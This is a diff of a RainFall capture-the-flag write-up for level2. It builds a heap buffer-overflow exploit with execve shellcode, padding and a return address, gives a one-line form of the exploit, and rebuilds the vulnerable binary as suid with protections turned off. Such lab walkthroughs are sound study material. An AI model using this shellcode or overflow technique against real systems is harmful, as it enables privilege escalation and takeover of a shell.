@@ -107,11 +107,11 @@ Lets create our exploit file, starting with our malicious bytecode, adding backs
 ```
 level2@RainFall:~$ echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" > /tmp/level2_exploit
 ```
-We earlier found the EIP offset is 80, we overflow the gets() buffer with whatever garbage until we reach 80 characters total.
+Earlier we found the EIP offset is 80, so let's overflow the gets() buffer with whatever garbage until we reach 80 characters total.
 ```
 level2@RainFall:~$ echo -e -n "------------------------------------------------------" >> /tmp/level2_exploit
 ```
-Finally overwrite the return address with the address of our malicious shellcode, now in the heap.
+Finally overwrite the return address with the address of our malicious shellcode, copied by strdup() to the heap.
 ```
 level2@RainFall:~$ echo -e -n "\x08\xa0\x04\x08" >> /tmp/level2_exploit
 ```
@@ -124,4 +124,29 @@ whoami
 level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+Here is the exploit in convenient one-line format:
+```
+echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80------------------------------------------------------\x08\xa0\x04\x08" > /tmp/level2_exploit; cat /tmp/level2_exploit - | ./level2
+```
+
+## Recreate Exploited Binary
+
+As user level3, in /tmp/ create and compile ```level2_source.c```
+```
+level3@RainFall:/tmp$ gcc level2_source.c -fno-stack-protector -z execstack -o level2_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level3@RainFall:/tmp$ chmod u+s level2_source; chmod +wx ~; mv level2_source ~
+```
+Exit back to user level2, then run the binary.
+```
+level3@RainFall:/tmp$ exit
+exit
+level2@RainFall:~$ echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80------------------------------------------------------\x08\xb0\x04\x08" > /tmp/level2_exploit; cat /tmp/level2_exploit - | /home/user/level3/level2_source
+[press enter]
+...
+whoami
+level3
 ```
